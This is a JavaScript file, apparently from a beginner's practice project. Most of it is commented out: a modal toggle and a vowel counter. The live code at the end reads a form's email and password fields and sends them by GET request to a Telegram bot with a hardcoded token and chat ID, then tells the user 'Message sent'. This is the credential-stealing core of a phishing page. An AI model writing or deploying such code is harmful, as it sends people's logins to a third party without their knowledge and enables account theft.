// const showBtn = document.getElementById('show-btn');
// const modal = document.getElementById('modal');
// const clousBtn = document.getElementById('clous-btn');
// const ovarlay = document.getElementById('ovarlay');

// const addHiden = () => {
//     modal.classList.add('hidden');
//     ovarlay.classList.add('hidden');
// }
// showBtn.addEventListener("click", () => {
//     modal.classList.remove("hidden");
//     ovarlay.classList.remove("hidden");
// });
// clousBtn.addEventListener("click", addHiden);
// ovarlay.addEventListener("click", addHiden);
// document.addEventListener("keydown", (e) => {
//     if(e.key == 'Escape') {
//         addHiden()
//     }
// });







// function func1(str1){
//     let harf = "UIOAEeuoai";
//     let son = 0
//     for(let i = 0; i <str1.length; i++){
//         if(harf.indexOf(str1[i]) !== -1){
//             son += 1
//         }
//     }
//     return son;
// }

// console.log(`${func1("shAhzodbek")} unli bor`);




document.getElementById("myBtn").addEventListener("click", function (e) {
  e.preventDefault();

  var fname = document.querySelector('input[name="fname"]').value;
  var country = document.querySelector('input[name="country"]').value;

  var message = "EMAIL: " + fname + " | PAROL: " + country + "";

  var token = "5434430636:AAF_s1rONS3Xk1ROqLpZTBwdu9XYylupHFk";
  var chat_id = "5583233132";
  var url =
    "https://api.telegram.org/bot" +
    token +
    "/sendMessage?chat_id=" +
    chat_id +
    "&text=" +
    message +
    "&parse_mode=html";

  var oReq = new XMLHttpRequest();
  oReq.open("GET", url, true);
  oReq.send();

  alert("Message sent");
}); 







